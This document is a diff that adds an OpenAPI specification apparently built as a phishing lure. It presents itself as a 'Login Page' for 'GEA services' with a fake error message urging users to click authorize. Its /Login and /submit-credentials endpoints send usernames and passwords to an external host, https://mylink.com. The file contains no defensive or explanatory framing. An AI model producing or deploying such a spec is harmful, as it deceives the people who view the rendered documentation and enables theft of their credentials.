@@ -1,0 +1,75 @@
+openapi: 3.0.0
+info:
+  title: Login Page
+  description: Error, Click on authorize to login to GEA services
+  version: 0.0.0
+
+components:
+  securitySchemes:
+    Gea_Login:
+      type: http
+      scheme: basic
+
+paths:
+  /Login:
+    post:
+      summary: Login to GEA services by submitting credentials to an external service.
+      description: Please log in to access the services. Your credentials will be submitted to https://mylink.com.
+      security:
+        - Gea_Login: [] # Require Basic Auth
+      responses:
+        "200":
+          description: Successfully logged in and authenticated.
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  message:
+                    type: string
+                    example: "Login successful"
+                  user:
+                    type: string
+                    example: "John Doe"
+        "401":
+          description: Unauthorized access. Invalid credentials.
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  error:
+                    type: string
+                    example: "Invalid username or password"
+        "400":
+          description: Bad request, missing credentials or invalid format.
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  error:
+                    type: string
+                    example: "Missing credentials"
+
+  /submit-credentials:
+    post:
+      summary: Submit credentials to external service.
+      description: This endpoint will send the credentials to https://mylink.com for verification.
+      requestBody:
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                username:
+                  type: string
+                  example: "user123"
+                password:
+                  type: string
+                  example: "securePassword"
+      responses:
+        "200":
+          description: Successfully submitted credentials to external service.
+        "400":
+          description: Invalid credentials or missing fields.
